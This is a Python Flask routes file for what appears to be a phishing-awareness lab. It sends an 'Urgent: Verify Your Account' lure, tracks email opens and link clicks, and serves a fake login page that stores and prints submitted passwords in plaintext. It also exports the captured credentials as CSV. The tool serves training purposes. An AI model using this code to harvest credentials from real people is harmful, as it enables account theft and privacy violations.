from flask import current_app as app
from flask import render_template, request, redirect, url_for, send_file, Response
from io import BytesIO
from .models import db, ClickLog, CredentialLog
from flask_mail import Message
from . import mail
import csv

# -------------------------------
# Home Page
# -------------------------------
@app.route('/')
def index():
    return render_template('index.html')


# -------------------------------
# Phishing Email Preview
# -------------------------------
@app.route('/send-email')
def send_email():
    return render_template('email_template.html')


# -------------------------------
# Send Test Email (via Mailtrap)
# -------------------------------
@app.route('/send-test-email')
def send_test_email():
    msg = Message(
        subject="Urgent: Verify Your Account",
        sender="admin@phishlab.com",
        recipients=["recipient@example.com"]  # Replace with your test address
    )
    msg.html = render_template("email_template.html")
    mail.send(msg)
    return "<h4>Email sent successfully via Mailtrap!</h4>"


# -------------------------------
# Track Email Open (Invisible Pixel)
# -------------------------------
@app.route('/track-open')
def track_open():
    email = request.args.get('email', 'unknown')
    ip = request.remote_addr
    print(f"[OPEN] Email viewed by {email} from {ip}")
    return send_file(BytesIO(b''), mimetype='image/gif')


# -------------------------------
# Phishing Link Tracker
# -------------------------------
@app.route('/phish-link')
def phish_link():
    ip = request.remote_addr
    log = ClickLog(ip_address=ip)
    db.session.add(log)
    db.session.commit()
    print(f"[CLICK] Link clicked from {ip}")
    return redirect(url_for('fake_login'))


# -------------------------------
# Summary Dashboard (Global View)
# -------------------------------
@app.route('/summary')
def summary():
    click_logs = ClickLog.query.order_by(ClickLog.timestamp.desc()).all()
    credential_logs = CredentialLog.query.order_by(CredentialLog.timestamp.desc()).all()

    return render_template(
        'summary.html',
        click_count=len(click_logs),
        credential_count=len(credential_logs),
        clicks=click_logs,
        credentials=credential_logs
    )


# -------------------------------
# Export Click Logs
# -------------------------------
@app.route('/export/clicks')
def export_clicks():
    logs = ClickLog.query.order_by(ClickLog.timestamp.desc()).all()

    def generate():
        data = [["IP Address", "Timestamp"]]
        data += [[log.ip_address, log.timestamp] for log in logs]
        for row in data:
            yield ','.join(map(str, row)) + '\n'

    return Response(generate(), mimetype='text/csv',
                    headers={"Content-Disposition": "attachment; filename=click_logs.csv"})


# -------------------------------
# Export Credential Logs
# -------------------------------
@app.route('/export/credentials')
def export_credentials():
    logs = CredentialLog.query.order_by(CredentialLog.timestamp.desc()).all()

    def generate():
        data = [["Email", "Password", "Timestamp"]]
        data += [[log.email, log.password, log.timestamp] for log in logs]
        for row in data:
            yield ','.join(map(str, row)) + '\n'

    return Response(generate(), mimetype='text/csv',
                    headers={"Content-Disposition": "attachment; filename=credential_logs.csv"})


# -------------------------------
# Fake Login Page
# -------------------------------
@app.route('/login', methods=['GET', 'POST'])
def fake_login():
    if request.method == 'POST':
        email = request.form.get('email')
        password = request.form.get('password')
        entry = CredentialLog(email=email, password=password)
        db.session.add(entry)
        db.session.commit()
        print(f"[CAPTURED] {email}:{password}")

        return '''
        <div style="background-color:#f8d7da; padding:30px; margin:30px auto; max-width:600px; border-radius:8px;
        border:1px solid #f5c2c7; color:#842029; font-family:sans-serif; text-align:center;">
            <h3>This was a simulated phishing attack. Stay safe!</h3>
            <p>You will be redirected shortly...</p>
        </div>
        <script>
            setTimeout(function() {
                window.location.href = "/";
            }, 5000);
        </script>
        '''
    return render_template('fake_login.html')
